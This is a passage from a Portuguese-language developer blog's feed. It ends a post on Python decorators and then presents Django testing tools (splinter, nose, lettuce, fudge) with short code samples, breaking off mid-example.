Chamando a funcao &lt;span class="s2"&gt;&amp;quot;meu_alvo&amp;quot;&lt;/span&gt;
Eu sou um alvo!
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vou tentar seguir um fluxo que deixe claro o que o procedimento está
realizando.&lt;/p&gt;
&lt;p&gt;O comportamento da função &lt;code&gt;meu_alvo&lt;/code&gt; é muito simples: imprimir &lt;code&gt;“Eu sou um alvo!”&lt;/code&gt; na tela. Mas o &lt;code&gt;@meu_decorador&lt;/code&gt; está lá para
complicar a nossa vida :D&lt;/p&gt;
&lt;p&gt;Com a chamada de &lt;code&gt;@meu_decorador&lt;/code&gt; logo acima de &lt;code&gt;meu_alvo&lt;/code&gt;, fica
claro que na verdade estamos passando &lt;code&gt;meu_alvo&lt;/code&gt; como um parâmetro
(&lt;code&gt;alvo&lt;/code&gt;) para o método &lt;code&gt;meu_decorador&lt;/code&gt;, encontrado logo no início
do arquivo. Note que o método retorna &lt;code&gt;wrapper&lt;/code&gt; sem os parênteses no
final (que caracterizam uma chamada de função), ele está retornando
apenas a referência ao método &lt;code&gt;wrapper&lt;/code&gt;, que será de fato “executado”
externamente.&lt;/p&gt;
&lt;p&gt;Dentro da função &lt;code&gt;wrapper&lt;/code&gt; temos a impressão da &lt;em&gt;string&lt;/em&gt; &lt;code&gt;‘Chamando a funcao “meu_alvo”‘&lt;/code&gt; e a execução de &lt;code&gt;meu_alvo&lt;/code&gt;. Isto deve-se ao
fato de que &lt;code&gt;alvo&lt;/code&gt; nada mais é que uma referência a função
&lt;code&gt;meu_alvo&lt;/code&gt;, que passamos como argumento para &lt;code&gt;meu_decorador&lt;/code&gt;
através do &lt;code&gt;@meu_decorador&lt;/code&gt; logo acima da função &lt;code&gt;meu_alvo&lt;/code&gt;,
certo?&lt;/p&gt;
&lt;p&gt;Então resumindo isso tudo, o resultado final é que &lt;code&gt;meu_alvo()&lt;/code&gt; no
final do arquivo na verdade é a execução da referência a &lt;code&gt;wrapper&lt;/code&gt;, ou
seja, é o mesmo que ler &lt;code&gt;“wrapper()“&lt;/code&gt;. Ele fará o &lt;em&gt;print&lt;/em&gt; e
posteriormente retornará o resultado de &lt;code&gt;meu_alvo&lt;/code&gt;, que nada mais é
que a impressão de &lt;code&gt;“Eu sou um alvo!”&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Bacana não? Aqui vai mais um para deixar as coisas um pouco mais claras…
vamos simular o esquema de roteamento de um &lt;em&gt;framework&lt;/em&gt; &lt;a href="https://klauslaube.com.br/tag/web.html"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;rotas&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;rota&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;endereco&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;wrapper&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fn&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;rotas&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;endereco&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fn&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;wrapper&lt;/span&gt;

&lt;span class="nd"&gt;@rota&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/index/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;home_view&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Pagina inicial&amp;#39;&lt;/span&gt;

&lt;span class="nd"&gt;@rota&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/contato/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;contato_view&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Pagina de contato&amp;#39;&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;rotas&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]()&lt;/span&gt;  &lt;span class="c1"&gt;# Pagina inicial&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;rotas&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]()&lt;/span&gt;  &lt;span class="c1"&gt;# Pagina de contato&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;rotas&lt;/span&gt;
&lt;span class="c1"&gt;# [(&amp;#39;/index/&amp;#39;, &amp;lt; function home_view at 0xb736580c &amp;gt;),&lt;/span&gt;
&lt;span class="c1"&gt;#  (&amp;#39;/contato/&amp;#39;, &amp;lt; function contato_view at 0xb7365b8c &amp;gt;)]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://devlog.waltercruz.com/python_decorators" title="Walter Cruz em um excelente post sobre Decorators em Python"&gt;&lt;em&gt;Devlog – @decorators&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.fiveminutes.eu/a-quick-introduction-to-python-decorators/" title="Uma introdução rápida aos decorators em Python. Muito bom!"&gt;&lt;em&gt;Five Minutes – A quick introduction to Python decorators&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.python.org/workshops/1997-10/proceedings/savikko.html" title="Padrões de Projetos em Python."&gt;&lt;em&gt;Python.org – Design Patterns in Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://wiki.python.org/moin/PythonDecorators" title="Decorators em Python, direto da Wiki oficial do Python"&gt;&lt;em&gt;Python.org – Python Decorators&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.siafoo.net/article/68" title="Decorators em Python não precisam ser assustadores. Um ótimo artigo."&gt;&lt;em&gt;Siafoo – Python Decorators Don’t Have to be (that) Scary&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pt.wikipedia.org/wiki/Decorator" title="Leia mais na Wikipedia sobre Decorators"&gt;&lt;em&gt;Wikipedia – Decorator&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="python"></category><category term="oop"></category><category term="design-patterns"></category><category term="decorators"></category></entry><entry><title>Ferramentas de testes em Django - Parte 2</title><link href="https://klauslaube.com.br/2011/07/23/ferramentas-de-testes-em-django-parte-2.html" rel="alternate"></link><published>2011-07-23T18:00:00-03:00</published><updated>2011-07-23T18:00:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-07-23:/2011/07/23/ferramentas-de-testes-em-django-parte-2.html</id><summary type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2011/07/18/ferramentas-de-testes-em-django-parte-1.html" title="Ferramentas de testes em Django - Parte 1"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;,
conhecemos as ferramentas &lt;em&gt;default&lt;/em&gt; para construção de testes
automatizados em &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;. Acontece que você pode “sair um pouco da
caixa” e usufruir de ferramentas “third-party“, que enriquecerão o seu
ambiente de desenvolvimento e lhe trarão maior segurança em seus &lt;a href="https://klauslaube.com.br/tag/testes.html" title="Leia mais sobre testes"&gt;testes
de &lt;em&gt;software&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;splinter – Testando a sua aplicação …&lt;/h2&gt;</summary><content type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2011/07/18/ferramentas-de-testes-em-django-parte-1.html" title="Ferramentas de testes em Django - Parte 1"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt;,
conhecemos as ferramentas &lt;em&gt;default&lt;/em&gt; para construção de testes
automatizados em &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;. Acontece que você pode “sair um pouco da
caixa” e usufruir de ferramentas “third-party“, que enriquecerão o seu
ambiente de desenvolvimento e lhe trarão maior segurança em seus &lt;a href="https://klauslaube.com.br/tag/testes.html" title="Leia mais sobre testes"&gt;testes
de &lt;em&gt;software&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;splinter – Testando a sua aplicação com um navegador&lt;/h2&gt;
&lt;p&gt;É perfeitamente possível criar testes de aceitação em &lt;em&gt;Django&lt;/em&gt; com a
&lt;a href="https://docs.djangoproject.com/en/dev/topics/testing/#module-django.test.client" title="Testando aplicações web com test client em Django"&gt;&lt;em&gt;TestClient&lt;/em&gt;&lt;/a&gt; e &lt;a href="http://lxml.de/" title="Faça parser XML e HTML com lxml"&gt;&lt;em&gt;lxml&lt;/em&gt;&lt;/a&gt;. Mas vamos ser sinceros, é deveras
trabalhoso “parsear” os resultados das suas &lt;em&gt;views&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Com a &lt;a href="http://splinter.cobrateam.info/" title="Visite a documentação oficial da Splinter"&gt;&lt;em&gt;Splinter&lt;/em&gt;&lt;/a&gt;, uma ferramenta para testes de aplicações
&lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, você pode automatizar ações executadas por navegadores, como
visitar uma página, preencher um formulário ou clicar em um &lt;em&gt;link&lt;/em&gt;; tudo
isso sem preocupar-se com &lt;em&gt;parsing&lt;/em&gt;, nós, &lt;em&gt;DOM&lt;/em&gt;, nem nada do tipo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;splinter.browser&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;Browser&lt;/span&gt;

&lt;span class="n"&gt;browser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Browser&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="c1"&gt;# Visitar uma URL&lt;/span&gt;
&lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://search.twitter.com&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;browser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;visit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;browser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fill&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;q&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;#cobrateam&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Procurar e clicar no botão &amp;#39;search&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;button&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;browser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find_by_css&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#searchButton input&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;first&lt;/span&gt;

&lt;span class="c1"&gt;# Interagir com os elementos&lt;/span&gt;
&lt;span class="n"&gt;button&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;click&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;browser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;is_text_present&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;No results for #cobrateam&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;nobody likes us =(&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;we&amp;#39;re popular =)&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O que eu acho mais bacana nesta ferramenta são os seletores, facilitam
muito na hora de checar resultados e comportamentos.&lt;/p&gt;
&lt;p&gt;A comunidade em volta desta ferramenta está em constante crescimento e
atividade. Portanto, caso você queira contribuir com o projeto, vá agora
mesmo para o &lt;a href="https://github.com/cobrateam/splinter" title="Repositório da Splinter no GitHub"&gt;repositório no &lt;em&gt;GitHub&lt;/em&gt; e colabore&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;nose – Caçando testes em seu projeto (Python)&lt;/h2&gt;
&lt;p&gt;E quando queremos fugir da regra? Aposto que chegará um momento em que a
estrutura de diretórios padrão, necessária para a execução dos seus
testes em &lt;em&gt;Django&lt;/em&gt;, não te satisfará mais. O que fazer neste caso?
Simples, recorra ao &lt;em&gt;Nose&lt;/em&gt;!&lt;/p&gt;
&lt;p&gt;O &lt;a href="http://somethingaboutorange.com/mrl/projects/nose/1.0.0/" title="Nose - is nicer testing for Python"&gt;&lt;em&gt;Nose&lt;/em&gt;&lt;/a&gt; estende os recursos da &lt;em&gt;unittest&lt;/em&gt; e facilita a escrita
e carregamento dos testes em projetos &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;. De uma forma mais
detalhada, ele percorre o seu projeto (ou uma determinada região de seu
escolha) executando subclasses da &lt;code&gt;unittest.TestCase&lt;/code&gt; ou funções que
contenham “test”. Por exemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# test_subclasse.py&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;unittest&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;SubclasseTest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unittest&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TestCase&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_um_eh_verdadeiro&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;assertTrue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# test_funcao.py&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test_zero_eh_falso&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ao executar o comando &lt;strong&gt;nosetests&lt;/strong&gt; o &lt;em&gt;nose&lt;/em&gt; se encarregará de procurar
e carregar os testes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nosetests
..
----------------------------------------------------------------------
Ran &lt;span class="m"&gt;2&lt;/span&gt; tests in &lt;span class="m"&gt;0&lt;/span&gt;.005s

OK
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;É claro que existe uma “mágica” aí. Na verdade o &lt;em&gt;nose&lt;/em&gt; pesquisará por
&lt;strong&gt;arquivos&lt;/strong&gt; &lt;em&gt;Python&lt;/em&gt; com “test” em seu nome, por &lt;strong&gt;funções&lt;/strong&gt; com “test”
em seu enunciado, e por &lt;strong&gt;classes&lt;/strong&gt; com métodos “test” em sua
declaração. Ele age mesmo como um “runner“, tendo a capacidade de lidar
com testes escritos com &lt;em&gt;unittest&lt;/em&gt; ou não.&lt;/p&gt;
&lt;p&gt;Essa é só a ponta do &lt;em&gt;iceberg&lt;/em&gt;. É possível construir &lt;em&gt;plugins&lt;/em&gt; para o
&lt;em&gt;nose&lt;/em&gt;, permitindo melhorar ainda mais o seu ambiente de testes (como
por exemplo, permitir que o &lt;a href="http://pypi.python.org/pypi/nosepipe/" title="Conheça o nosepipe"&gt;&lt;em&gt;nose&lt;/em&gt; funcione em &lt;em&gt;subprocess&lt;/em&gt;
separados&lt;/a&gt;).&lt;/p&gt;
&lt;h3&gt;Caçando testes em seu projeto (Django)&lt;/h3&gt;
&lt;p&gt;Para facilitar ainda mais a escrita de testes em &lt;em&gt;Django&lt;/em&gt; existem
&lt;em&gt;plugins&lt;/em&gt; como o &lt;a href="http://pypi.python.org/pypi/django-nose" title="Utilize o nose em seus projetos Django"&gt;&lt;em&gt;django-nose&lt;/em&gt;&lt;/a&gt;, que permite que você substitua o
&lt;em&gt;Test Runner&lt;/em&gt; padrão da &lt;em&gt;framework&lt;/em&gt; por um específico que utiliza o
&lt;em&gt;nose&lt;/em&gt;, unindo assim a facilidade e “add-ons” do &lt;em&gt;nose&lt;/em&gt; com o ambiente
de testes do &lt;em&gt;Django&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;lettuce – BDD em Django&lt;/h2&gt;
&lt;p&gt;E se você estava se perguntando sobre &lt;a href="https://klauslaube.com.br/tag/bdd.html" title="Leia mais sobre BDD"&gt;&lt;em&gt;BDD&lt;/em&gt;&lt;/a&gt; em &lt;em&gt;Django&lt;/em&gt;, eu
apresento a &lt;a href="http://lettuce.it/intro/overview.html#intro-overview" title="Saiba mais sobre a lettuce"&gt;&lt;em&gt;Lettuce&lt;/em&gt;&lt;/a&gt;!&lt;/p&gt;
&lt;p&gt;Esta ferramenta, baseada na &lt;a href="http://cukes.info/" title="Cucumber - Making BDD fun"&gt;&lt;em&gt;Cucumber&lt;/em&gt;&lt;/a&gt;, permite com que você escreva
histórias utilizando linguagem ubíqua, mais próxima da área de negócios
do que da área técnica, e automatize a validação delas.&lt;/p&gt;
&lt;p&gt;O mais bacana é que ela já vem preparada para o &lt;em&gt;Django&lt;/em&gt;, permitindo que
a gente execute os testes de comportamento de forma fácil e rápida:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Feature: Rocking with lettuce and django

    Scenario: Simple Hello World
        Given I access the url &amp;quot;/&amp;quot;
        Then I see the header &amp;quot;Hello World&amp;quot;

    Scenario: Hello + capitalized name
        Given I access the url &amp;quot;/some-name&amp;quot;
        Then I see the header &amp;quot;Hello Some Name&amp;quot;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;História escrita, vamos escrever o &lt;em&gt;script&lt;/em&gt; &lt;em&gt;Python&lt;/em&gt; que validará se está
tudo de acordo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;lettuce&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;lxml&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;html&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.test.client&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Client&lt;/span&gt;

&lt;span class="nd"&gt;@before.all&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;set_browser&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;world&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;browser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Client&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="nd"&gt;@step&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;r&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;I access the url &amp;quot;(.*)&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;access_url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;step&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;world&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;browser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;world&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dom&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fromstring&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="nd"&gt;@step&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;r&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;I see the header &amp;quot;(.*)&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;see_header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;step&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;header&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;world&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dom&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cssselect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;h1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="n"&gt;header&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Basta executá-lo da seguinte maneira:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python manage.py harvest
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;a href="http://lettuce.it/recipes/django-lxml.html#recipes-django-lxml" title="Django + Lettuce, uma dupla interessante!"&gt;Confira mais informações sobre como utilizar o &lt;em&gt;lettuce&lt;/em&gt; com &lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;fudge – Ajude o Python a mentir&lt;/h2&gt;
&lt;p&gt;O &lt;a href="http://farmdev.com/projects/fudge/" title="Fudge, criando objetos mentirosos"&gt;&lt;em&gt;Fudge&lt;/em&gt;&lt;/a&gt; é um módulo &lt;em&gt;Python&lt;/em&gt; que auxilia na construção de
objetos “dublês” (&lt;a href="http://www.infoq.com/br/articles/mocks-Arent-Stubs" title="Mocks não são Stubs"&gt;&lt;em&gt;mocks&lt;/em&gt; e &lt;em&gt;stubs&lt;/em&gt;&lt;/a&gt;), que permitem escrever testes
sem necessariamente possuir um serviço ativo ou um objeto construído.&lt;/p&gt;
&lt;p&gt;Um caso comum: Você está construindo uma &lt;em&gt;API&lt;/em&gt; que autentica via &lt;em&gt;OAuth&lt;/em&gt;
ao &lt;em&gt;Twitter&lt;/em&gt; e está utilizando testes para guiar o seu desenvolvimento.
Não é interessante que nossos testes sejam dependentes da
disponibilidade do serviço do &lt;em&gt;Twitter&lt;/em&gt;, portanto, escrevemos um “objeto
mentiroso”, que simulará este serviço, aceitando uma entrada e gerando
um saída:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;fudge&lt;/span&gt;

&lt;span class="nd"&gt;@fudge.patch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;oauthtwitter.OAuthApi&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;test&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;FakeOAuthApi&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;FakeOAuthApi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;expects_call&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;with_args&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;returns_fake&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
